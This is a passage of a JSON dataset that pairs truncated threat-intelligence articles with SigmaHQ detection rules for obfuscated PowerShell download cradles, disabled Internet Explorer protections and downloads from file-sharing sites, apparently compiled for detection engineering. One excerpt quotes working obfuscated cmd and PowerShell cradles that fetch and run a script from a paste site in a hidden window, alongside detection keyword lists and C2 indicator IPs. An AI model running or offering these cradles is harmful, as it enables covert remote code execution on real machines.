    "url": "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
    "markdown": "# Operation Ke3chang Resurfaces With New TidePool Malware **Published:** May 22, 2016 ## Introduction Little has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also",
    "sigma_rule": {
      "title": "Disabled IE Security Features",
      "id": "fb50eb7a-5ab1-43ae-bcc9-091818cb8424",
      "status": "test",
      "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features",
      "references": [
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-06-19",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "CommandLine|contains|all": [
            " -name IEHarden ",
            " -value 0 "
          ]
        },
        "selection2": {
          "CommandLine|contains|all": [
            " -name DEPOff ",
            " -value 1 "
          ]
        },
        "selection3": {
          "CommandLine|contains|all": [
            " -name DisableFirstRunCustomize ",
            " -value 2 "
          ]
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_disable_ie_features.yml"
  },
  "335": {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story **Categories:** cobaltstrike gootloader lazagne psexec **Published on:** May 9, 2022 --- In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents. ## Background Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The",
    "sigma_rule": {
      "title": "Obfuscated PowerShell OneLiner Execution",
      "id": "44e24481-6202-4c62-9127-5a0ae8e3fe3d",
      "status": "test",
      "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-09",
      "modified": "2025-04-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\powershell.exe",
          "CommandLine|contains|all": [
            "http://127.0.0.1",
            "%{(IRM $_)}",
            "Invoke"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_cradle_obfuscated.yml"
  },
  "336": {
    "url": "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38",
    "markdown": "# Download Cradles ## 0) Extra goodies - Obfuscated `FromBase64String` with `-bxor` nice for dynamic strings deobfuscation: ``` $t=(type);($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('Yk9CA05CA0hMV0I=')|%{$_-bxor35}|%{[char]$_})-join'' ``` - The same as above but for UTF-16 base64 encoded strings: ``` $t=(type);-join[char[]]([uint16[]]$t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('MAA7ACAAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA')-ne0) ``` ## A) Powershell Code Execution primitives Phrase `(Function).Invoke()` may be rephrased as: `&(Function)` 1. *Scriptblock*: ``` [scriptblock]::Create('Get-Service').Invoke() ``` 2. PS1.0 Invoke: ``` $ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|Where{$_.Name-ilike'In*'}).Name).Invoke('Get-Service') ``` 3. Get-Alias: ``` &(DIR Alias:/I*X)'Get-Service' ``` 4. Get-Command: ``` &(GCM I*e-E*) ``` 5. Powershell Runspace: ``` [PowerShell]::Create().(([PowerShell]::Create()|Member)[5].Name).Invoke('Get-Service').Invoke() ``` 6. Concatenated IEX: ``` &(''.SubString.ToString()[67,72,64]-Join'')'Get-Service' ``` 7. *Invoke-AsWorkflow* (PS3.0+): ``` Invoke-AsWorkflow -Ex ('Get-Service') ``` ## B) Powershell Payload Download primitives 1. Invoke-RestMethod (PS3.0+): ```",
    "sigma_rule": {
      "title": "Obfuscated PowerShell OneLiner Execution",
      "id": "44e24481-6202-4c62-9127-5a0ae8e3fe3d",
      "status": "test",
      "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-09",
      "modified": "2025-04-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\powershell.exe",
          "CommandLine|contains|all": [
            "http://127.0.0.1",
            "%{(IRM $_)}",
            "Invoke"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_cradle_obfuscated.yml"
  },
  "337": {
    "url": "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd",
    "markdown": "# Not proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe) ## Windows Command Shell download cradles, not proxy aware lightly obfuscated ``` c:\\WInDowS\\sySTEM32\\cmD.eXE /c PoWErSheLl -nopROfi -EXe byPAsS -wiNDOwsTy HIDdEN -cOMMA \"IEX (New-Object Net.Webclient).downloadstring(\\\"https://pastebin.com/raw/88SGrHVh\\\")\" ``` ``` PoWErSheLl -nopROfi -EXe byPAsS -wiNdOwsTy HIDdEN -cOMMA \"IEX (New-Object Net.Webclient).downloadstring(\\\"https://pastebin.com/raw/88SGrHVh\\\")\" ``` ``` POWErshelL -NoPRofi -WiNdoWSTYL hidd -EXecUTiOnPO BYpASS -cO \"i`EX ( neW-o`BJE`cT N`ET.`weBcl`IeNT ).\\\"do`wnLO`ADS`TRinG\\\"( \\\"https://pastebin.com/raw/88SGrHVh\\\" )\" ``` ## Windows Command Shell download cradles, not proxy aware obfuscated ``` c:\\wiNdoWs\\sysTEM32\\CmD /c pOWeRsheLl -WiNDOW HIddEN -eXECUTI BYpaSS -nop -CoMmanD \"(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/88SGrHVh')|.( ([String]''.Chars)[15,18,19]-Join'')\" ``` ``` pOWeRshell -WiNDOW HIddEN -eXECUTI BYpaSS -nop",
    "sigma_rule": {
      "title": "PowerShell Download and Execution Cradles",
      "id": "85b0b087-eddf-4a2b-b033-d771fa2b9775",
      "status": "test",
      "description": "Detects PowerShell download and execution cradles.",
      "references": [
        "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd",
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-24",
      "modified": "2023-05-04",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr "
          ]
        },
        "selection_iex": {
          "CommandLine|contains": [
            ";iex $",
            "| IEX",
            "|IEX ",
            "I`E`X",
            "I`EX",
            "IE`X",
            "iex ",
            "IEX (",
            "IEX(",
            "Invoke-Expression"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some PowerShell installers were seen using similar combinations. Apply filters accordingly"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_iex.yml"
  },
  "338": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "PowerShell Download and Execution Cradles",
      "id": "85b0b087-eddf-4a2b-b033-d771fa2b9775",
      "status": "test",
      "description": "Detects PowerShell download and execution cradles.",
      "references": [
        "https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd",
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-24",
      "modified": "2023-05-04",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr "
          ]
        },
        "selection_iex": {
          "CommandLine|contains": [
            ";iex $",
            "| IEX",
            "|IEX ",
            "I`E`X",
            "I`EX",
            "IE`X",
            "iex ",
            "IEX (",
            "IEX(",
            "Invoke-Expression"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some PowerShell installers were seen using similar combinations. Apply filters accordingly"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_iex.yml"
  },
  "339": {
    "url": "https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html",
    "markdown": "# Black Kingdom ransomware (TTPs & IOC) We would like to share with the community the following TTPs and IOC related to *Black Kingdom* ransomware and threat actors using it. ### Initial Access Attackers gained initial access to the infrastructure via Pulse Secure VPN vulnerability https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510. ### Persistence For persistence, they use a scheduled task https://attack.mitre.org/techniques/T1053/. Task name is `GoogleUpdateTaskMachineUSA`, which resembles a legitimate task of *Google Chrome* that ends with `UA`, not `USA`. The malicious task executes the following code: ``` <Exec> <Command>powershell.exe</Command> <Arguments>-windowstyle hidden -file 'C:\\ProgramData\\Microsoft\\Windows\\Caches\\cversions_cache.ps1'</Arguments> </Exec> ``` ### PowerShell Script Content of the `cversions_cache.ps1` PowerShell script: ```",
    "sigma_rule": {
      "title": "PowerShell Download Pattern",
      "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
      "related": [
        {
          "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a Powershell process that contains download commands in its command line string",
      "references": [
        "https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html",
        "https://web.archive.org/web/20240609181157/https://lab52.io/blog/winter-vivern-all-summer/",
        "https://hatching.io/blog/powershell-analysis/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro",
      "date": "2019-01-16",
      "modified": "2023-01-26",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "new-object",
            "net.webclient).",
            "download"
          ],
          "CommandLine|contains": [
            "string(",
            "file("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_patterns.yml"
  },
  "340": {
    "url": "https://web.archive.org/web/20240609181157/https://lab52.io/blog/winter-vivern-all-summer/",
    "markdown": "# Winter Vivern – all Summer **September 28, 2021** In July, 2021, Lab52 found a currently active infection campaign (domain still up at the time of this writing) attributed to a group referred to as Wintervivern after a report published by the research team from DomainTools. As the starting point for this research, we recently noticed that unless properly obfuscated, some functions in XLM macro could show their arguments in the strings of the excel file containing the macros. ```image Alt: image Description: The image displays a terminal output from a macro deobfuscation tool (XLM Macro Deobfuscator v0.1.4). The output",
    "sigma_rule": {
      "title": "PowerShell Download Pattern",
      "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
      "related": [
        {
          "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a Powershell process that contains download commands in its command line string",
      "references": [
        "https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html",
        "https://web.archive.org/web/20240609181157/https://lab52.io/blog/winter-vivern-all-summer/",
        "https://hatching.io/blog/powershell-analysis/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro",
      "date": "2019-01-16",
      "modified": "2023-01-26",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "new-object",
            "net.webclient).",
            "download"
          ],
          "CommandLine|contains": [
            "string(",
            "file("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_patterns.yml"
  },
  "341": {
    "url": "https://hatching.io/blog/powershell-analysis/",
    "markdown": "# Powershell Static Analysis & Emotet results **Date:** 2020-01-07 **Tags:** triage, malware, powershell > Warning: this blogpost contains malicious URLs, don't open 'em. > Note: Scroll down if you're only interested in the Emotet results. ## Powershell twirks Due to a high number of Powershell droppers in our public cloud, we’ve implemented an engine for Powershell that translates Powershell into an AST, deobfuscates it, and runs various high-level static analysis algorithms on the deobfuscated AST. For specific use-cases, a limited Powershell emulator has also been implemented. With that out of the way, we wanted to share some `\"\"\"InTErEstInG\"\"\"` features of",
    "sigma_rule": {
      "title": "PowerShell Download Pattern",
      "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
      "related": [
        {
          "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a Powershell process that contains download commands in its command line string",
      "references": [
        "https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html",
        "https://web.archive.org/web/20240609181157/https://lab52.io/blog/winter-vivern-all-summer/",
        "https://hatching.io/blog/powershell-analysis/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro",
      "date": "2019-01-16",
      "modified": "2023-01-26",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "new-object",
            "net.webclient).",
            "download"
          ],
          "CommandLine|contains": [
            "string(",
            "file("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_patterns.yml"
  },
  "342": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
      "id": "b6e04788-29e1-4557-bb14-77f761848ab8",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using PowerShell.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-23",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr ",
            "wget "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_susp_file_sharing_domains.yml"
  },
  "343": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
      "id": "b6e04788-29e1-4557-bb14-77f761848ab8",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using PowerShell.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-23",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr ",
            "wget "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_susp_file_sharing_domains.yml"
  },
  "344": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
    "markdown": "# New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs **Published on January 17, 2024** --- Since November 2023, Microsoft has observed a distinct subset of Mint Sandstorm (PHOSPHORUS) targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, Mint Sandstorm used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.",
    "sigma_rule": {
      "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
      "id": "b6e04788-29e1-4557-bb14-77f761848ab8",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using PowerShell.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-23",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr ",
            "wget "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_susp_file_sharing_domains.yml"
  },
  "345": {
    "url": "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
    "markdown": "# SlashAndGrab: ScreenConnect Post-Exploitation in the Wild (CVE-2024-1709 & CVE-2024-1708) **February 23, 2024** --- ## Table of Contents: - Adversaries Deploying Ransomware - Adversaries Enumerating - Adversary Cryptocurrency Miners - Adversaries Installing Additional Remote Access - Downloading Tools and Payloads - Adversaries Dropping Cobalt Strike - Adversaries Persisting - Wrapping Up - Appendix --- Since February 19, Huntress has been sharing technical details of the ScreenConnect vulnerability we’re calling “SlashAndGrab.” In previous posts, we shared the details of this vulnerability, its exploit, and shared detection guidance. In this article, we’ve collected and curated threat actor activity fresh from the Huntress",
    "sigma_rule": {
      "title": "Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE",
      "id": "b6e04788-29e1-4557-bb14-77f761848ab8",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using PowerShell.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-23",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_download": {
          "CommandLine|contains": [
            ".DownloadString(",
            ".DownloadFile(",
            "Invoke-WebRequest ",
            "iwr ",
            "wget "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_susp_file_sharing_domains.yml"
  },
  "346": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
    "markdown": "# Profiling DEV-0270: PHOSPHORUS’ ransomware operations **Research** | **Threat intelligence** | **Threat actors** **September 7, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **PHOSPHORUS** is now tracked as **Mint Sandstorm** > - **DEV-0270** is now tracked as **Storm-0270** > > To learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.",
    "sigma_rule": {
      "title": "Email Exifiltration Via Powershell",
      "id": "312d0384-401c-4b8b-abdf-685ffba9a332",
      "status": "test",
